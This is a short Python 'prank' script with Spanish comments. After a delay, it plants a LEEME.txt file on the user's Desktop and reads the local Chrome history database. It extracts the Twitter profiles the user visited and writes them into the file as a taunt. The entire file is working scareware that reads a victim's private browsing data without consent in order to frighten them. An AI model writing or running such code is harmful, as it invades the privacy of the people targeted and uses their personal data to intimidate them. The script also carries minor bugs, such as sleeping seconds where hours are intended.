#Programa broma
import os
from pathlib import Path
from time import sleep
from random import randrange
import sqlite3
import re

HACKERFILE_NAME = "LEEME.txt"


def get_user_path():
    return "{}/".format(Path.home())


def delay_action():
    # Esperaremos entre 1 y 3 horas
    n_hours = randrange(1, 4)
    print("Durmiendo {} Horas".format(n_hours))
    sleep(n_hours)


def create_hacker_file(user_path):
    hacker_file = open(user_path + "Desktop/" + HACKERFILE_NAME, "w")
    hacker_file.write("Ya mamaste TAC...\n")
    return hacker_file


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            #Cierra la conexion
            connection.close()
            print(urls)
            return urls
        #Si el programa peta
        except sqlite3.OperationalError:
            print("Historial inaccesible, reintentando en 3 segundos...")
            sleep(3)


def check_twitter_profiles_and_scare_user(hacker_file, chrome_history):
    profiles_visited = []
    for item in chrome_history:                 #Expresion regular
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notifications", "home"]:
            profiles_visited.append(results[0])                                 #.join une un iterable con un caracter
    hacker_file.write("Ya vi que andas viendo los perfiles de {}...".format(", ".join(profiles_visited)))



def main():
    #Esperamos entre 1 y 3 horas
    delay_action()
    # w Si el archivo existe o no existe lo sobre escribe o lo crea modo escritura
    # r Requiere que el archivo exista modo lectura
    user_path = get_user_path()
    hacker_file = create_hacker_file(user_path)
    chrome_history = get_chrome_history(user_path)
    # Escribiendo mensajes
    check_twitter_profiles_and_scare_user(hacker_file, chrome_history)


if __name__ == "__main__":
    main()
